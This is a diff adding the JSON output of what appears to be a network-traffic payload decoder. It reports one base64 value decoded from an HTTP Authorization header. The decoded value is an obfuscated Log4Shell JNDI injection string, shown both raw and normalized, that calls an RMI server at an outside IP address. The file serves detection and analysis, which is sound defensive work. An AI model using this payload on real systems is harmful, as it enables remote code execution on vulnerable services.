@@ -1,0 +1,29 @@
+{
+  "ok": true,
+  "data": {
+    "status": "decode_success",
+    "decoded_candidates": [
+      {
+        "segment_no": 4,
+        "candidate_type": "base64",
+        "position": "http_header.authorization",
+        "source": "http.authorization.basic.value",
+        "raw": "YXR0YWNrZXI6JHske2xvd2VyOmp9JHt1cHBlcjpufSR7bG93ZXI6ZH0ke3VwcGVyOml9OiR7bG93ZXI6cn1tJHtsb3dlcjppfTovLzM0LjkxLjczLjM3OjEwOTkvZ3A5cGM3fQ==",
+        "decoded_preview": "attacker:${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}://34.91.73.37:1099/gp9pc7}",
+        "normalized_payload": "attacker:${jndi:rmi://34.91.73.37:1099/gp9pc7}",
+        "nested_candidates": [],
+        "decode_status": "success",
+        "span": null,
+        "residue_signals": [],
+        "stream_key": "172.17.0.1:56876-172.17.0.4:8888-tcp",
+        "protocol": "HTTP"
+      }
+    ],
+    "failed_candidates": [],
+    "residue_candidates": [],
+    "excluded_streams": [],
+    "checked_streams": 7,
+    "checked_segments": 32
+  },
+  "error": null
+}
